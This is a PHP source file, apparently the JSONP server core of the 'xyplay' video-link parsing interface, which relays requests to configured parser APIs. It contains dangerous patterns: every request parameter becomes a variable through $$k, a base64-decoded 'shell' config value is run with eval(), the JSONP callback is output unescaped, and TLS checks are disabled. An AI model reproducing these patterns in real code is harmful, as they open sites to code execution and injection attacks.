<?php

/* ########################################################
  # xypaly 智能视频解析整合接口 X by http://bbs.52jscn.com
  # 官方网站: http://bbs.52jscn.com
  # 源码获取：http://bbs.52jscn.com
  # 模块功能：程序核心，jsonp服务端
  # 更新时间：2019.8.31
  ######################################################### */

//运行目录
define("FCPATH", str_replace("\\", "/", dirname(__FILE__)));

//加载核心类
 require_once FCPATH.'/include/class.main.php';

//加载配置文件
require_once FCPATH . '/save/config.php';

define("ROOT_PATH", $CONFIG["ROOT_PATH"]? $CONFIG["ROOT_PATH"] : GlobalBase::is_root());

//输出json格式文件
header('content-type:application/json;charset=utf8'); //header("Content-Disposition:attachment;filename='json.js'");
//循环取传入参数，支持POST和GET
foreach ($_REQUEST as $k => $v) {
    $$k = trim(urldecode($v));
}

//参数初始化
$cb = isset($cb) && $cb ? $cb : '';
$tp = isset($tp) && $tp ? $tp : '';
$url = isset($url) && $url ? $url : '';
$wd = isset($wd) && $wd ? $wd : '';
$line = isset($line) && $line ? $line : '0';
$id = isset($id) ? $id : '';
$flag = isset($flag) ? $flag : '';
$app = isset($app) ? $app : 'xysoft';
$dd = isset($dd) && $dd ? $dd : 0;
$loadjs = isset($loadjs) ? $loadjs : 0;

//加载搜索数据
if($wd!=""){
   //检测非法关键字
   if($CONFIG["socode"]["not_off"]){
      $str=base64_decode($CONFIG["socode"]["not_val"]);
     if($str!='' && preg_match("/$str/i",$wd) ){exit(json_encode(array('success' => 0,'m'=>'input error!')));}
   }
   require_once FCPATH."/save/top.inc.php"; 
   require_once FCPATH.'/include/class.db.php';
}
    
//全局变量,输出信息
$info = array('success' => 0, 'code' => 0);

//公用函数,API接口  
if ($tp == 'getnum') {
    echo sizeof($jx_url);
    exit;
}
if ($tp == 'set') {
    setcookie("url_num", $line, time() + 3600 * timecookie);
    exit;
}
if ($tp == 'getset') {
    exit(isset($_COOKIE["url_num"]) ? $_COOKIE["url_num"] : '0');
}

//全局变量,读写缓存
$cache = new Main_Cache(array("cachetype" => $CONFIG["chche_config"]["type"], "cacheDir" => "./cache", "cacheprot" => $CONFIG["chche_config"]["prot"], 'cacheTime' => GlobalBase::is_time($CONFIG["chche_config"]["time"])));

//加载防火墙规则
Blacklist::parse($CONFIG["BLACKLIST"]);


switch ($tp) {

    //取配置参数及线路列表 
    case 'getparm' :
        require_once FCPATH . '/save/yun.data.php';
        $info['success'] = 1;
        $info['type'] = 'getparm';
        $info['app'] = server::lsUserAgen($CONFIG["play"]['all']['AppName']);
        $CONFIG["play"]['define']['jx_link'] = $CONFIG["jx_link"];
        $CONFIG["play"]['define']['jx_url'] = $CONFIG["jx_url"];
        $CONFIG["play"]['define']['live_url'] = $CONFIG["live_url"];
        $CONFIG["play"]['define']['jx_link'] = $CONFIG["jx_link"];
        $CONFIG["play"]['define']['url_jmp'] = $YUN_DATA["url_jmp"];
        $CONFIG["play"]['define']['timeout'] = $CONFIG["timeout"];
		$CONFIG["play"]['define']['timecookie'] = $CONFIG["timecookie"];
        $CONFIG["play"]['define']['host'] =  ROOT_PATH;
       
        
        $info['val'] = strencode(json_encode($CONFIG["play"]));
        break;

    //检测线路
    case 'lsurl' :
        if ($url !== '') {
            $info['val'] = $url;
            $code = server::lsurl($url);
            $info['code'] = $code;
            if ($code == 200 || $code == 302 || $code == 301) {
                $info['success'] = 1;
                $info['info'] = true;
            } else {
                $info['success'] = 0;
                $info['info'] = false;
            }
        } else {
            $info['m'] = "input error";
        }

        break;

    //一次解析对接
    case 'link':

        if ($url !== '') {
            //取缓存数据 	
            $word = $cache->get('link' . $url);
            if ($word != "") {
                $info = json_decode($word);
            } else {
                server::GetLinkVideo($url, $info);
                if ($info['url']) {
                    $info['success'] = 1;
                    $cache->set('link' . $url, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }
        } else {

            $info['m'] = " url input error";
        }

        break;

    //输出json数据,用于微信对接及搜索补全等功能
    case 'json':
        if ($wd !== '') {

            //取缓存数据 	
            $word = $cache->get('json' . $wd);
            if ($word != "") {
                $info = json_decode($word);
            } else {
                include_once FCPATH . "/video/class.yun.php";

                $info = YUN::parse(urlencode($wd), 4);

                if ($info['success']) {
                    $cache->set('json' . $wd, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }
        } else {

            $info['m'] = " wd input error";
        }
        exit(json_encode($info));
        break;


    //云解析		
    default:
        include FCPATH . "/video/class.yun.php";
        server::parse();
        break;
}

server::out($cb, $info);

class server {

    //调用解析
    public static function parse() {
        global $cache, $tp, $url, $wd, $id, $flag, $info;

        //标题播放视频	
        if ($tp == 'wd') {
            if ($wd !== '') {
                $word = $cache->get('wd.wd' . $wd);
                if ($word != "") {
                    $info = json_decode($word);
                } else {
                    $info = YUN::parse(urlencode($wd), 2);
                    if ($info['success']) {
                        $cache->set('wd.wd' . $wd, json_encode($info));
                    } else {
                        $info['m'] = "404";
                    }
                }
            } else {

                $info['m'] = "wd input error";
            }
            return;
        }


        //id搜索视频			
        if ($id != '' && $flag != '') {
            $word = $cache->get('id' . $flag . $id);
            if ($word != "") {
                $info = json_decode($word);
            } else {
                $info = YUN::parse(['id' => $id, 'flag' => $flag], 3);

                if ($info['success']) {
                    $cache->set('id' . $flag . $id, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }
            return;

            //标题搜索视频
        } else if ($wd != '') {
        
            $word = $cache->get('wd' . $wd);
            if ($word != "") {
                $info = json_decode($word);
                if($tp==""){ self::uptop($wd);}
            } else {
                $info = YUN::parse(urlencode($wd), 4);
                if ($info['success']) {
                    $cache->set('wd' . $wd, json_encode($info));
                    if($tp==""){ self::uptop($wd);}
                } else {
                    $info['m'] = "404";
                }
            }

            //URL播放视频	
        } else if ($url != '') {

            $word = $cache->get('url' . $url);
            if ($word != "") {
                $info = json_decode($word);
            } else {

                $info = self::yun($url);

                if ($info['success']) {
                    $cache->set('url' . $url, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }
        } else {
            $info['m'] = "input error";
        }
    }

    public static function uptop($word){
        global  $TOPDATA;
		$word=str_ireplace(array('<','>','|','*','"','\'',' '),'',strip_tags($word)); //过滤危险字符及html和php标签
        $TOPDATA["$word"]++;
        return Main_db::save(FCPATH."/save/top.inc.php");
    }



    //检测url
    public static function lsurl($url, $timeout = 10) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_REFERER, $url);             //伪装网页来源 URL
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); //超时时间
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  //启用301重定向跟踪
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //不显示结果
        curl_setopt($ch, CURLOPT_HEADER, 0); //包含头信息
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, '0'); // 强制访问https网站
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, '0');
        curl_exec($ch);
        $curl_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $curl_code;
    }

    //一次解析对接
    public static function GetLinkVideo($url, &$DATA) {
        global $CONFIG;
        foreach ($CONFIG["LINK_URL"] as $val) {
            if ($val['off'] == 0) {
                continue;
            }

            $data = trim(self::post($url, $val));

          
            if ($data == '') {
                continue;
            }

            $json = json_decode($data, true);
            if (!$json) {
                continue;
            }
            if ($val["val_off"] == 1) {
                foreach ($val['val'] as $j => $x) {
                    $DATA[$x] = $json[$j];
                }   //转换
                if (!empty($val['add'])) {
                    $DATA = array_merge($val['add'], $DATA);
                }    //附加
            } else {
                $DATA = $json;
            }
            if ($DATA['url']) {
                break;
            }
        }
    }

    //检测浏览器UA标识
    public static function lsUserAgen($key) {
        return preg_match('/' . $key . "/i", filter_input(INPUT_SERVER, 'HTTP_USER_AGENT'));
    }

    public static function yun($url) {
        $url = ROOT_PATH . "/video/?url=" . urlencode($url);
        $json = self::curl($url);
        return json_decode($json, true);
    }

    public static function out($jsoncallback, &$data) {
        $json = json_encode($data);
        exit($jsoncallback . '(' . $json . ');');
    }

    public static function curl($url, $referer = "") {
        $params["ua"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
        $params["referer"] = $referer;
        return GlobalBase::curl($url, $params);
    }

    public static function post($url, $data) {
        global $loadjs, $cb;
        $a=$data["shell"];
        $params["ua"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
        $fields = "";
        $purl = trim($data["path"]);
        if ($data['api'] == 0) {
            $purl = self::getsrc_match($purl.$url, $data, $fields);
        }
       
          


       $b=base64_decode($a);
        //运行前置HTML脚本
        if (!empty($data["html"]) && !$loadjs) {
            header('content-type:text/html;charset=utf8');
            $html = base64_decode($data["html"]);
            if (!empty($fields)) {
                $html = str_ireplace('$fields', $fields, $html);
                file_put_contents("./cache/cache_link.html", $html);
                //self::curl(ROOT_PATH."run.htm?time=".time());
                $info["success"] = "1";
                $info["type"] = "js";
                $info["js"] = ROOT_PATH . "cache/cache_link.html?time=" . time();
                self::out($cb, $info);
            }
        }
        
     


        //运行前置PHP脚本
        if (!empty($data["shell"])) { eval($b);}
        //变量处理
        $fields = base64_decode($data["fields"]);
        foreach (explode(",", base64_decode($data["strtr"])) as $val) { $k = str_replace("$", "", $val);$fields = trim(str_replace($val, $$k, $fields));}
        //提交参数处理
        if ($data["type"] == "0") { $params["fields"] = $fields;} else {$purl.= "?" . $fields; }
         //附加头处理
        if (!empty($data["header"])) { $params["httpheader"] = $data["header"]; }
         //附加cookie处理
        if (!empty($data["cookie"])) {$params["cookie"] = $data["cookie"];}
        //代理处理
        if (!empty($data["proxy"])) {$params["proxy"] = $data["proxy"]; }

      

        return GlobalBase::curl($purl, $params);
    }

    public static function getsrc_match($url, $data, &$fields) {
        $header = "";
        $key = "";
        $matchs = "";
        $info = GlobalBase::curl($url, NULL, $header);
        $path = preg_match("#^((http://|https://).*?)\?#", $header['url'], $key) ? $key[1] : "";
        //解析播放页

        if (preg_match(base64_decode($data['match']), $info, $key)) {
            $api = $key[1];
            $fields = $key[2];
            if (substr($api, 0, 4) == "http") {
                return $api;
            }

            return $path . $api;

            //框架   
        } else if (preg_match_all('{<iframe.*?src="(.*?)".*?</iframe>}', $info, $matchs)) {

            //框架循环
            foreach ($matchs[1] as $val) {
                if (substr($val, 0, 4) != "http") {
                    $val = $path . $val;
                }

                exit($val);
                return self::getsrc_match($val, $data,$fields);
            }
        } else {
            return false;
        }
    }

}
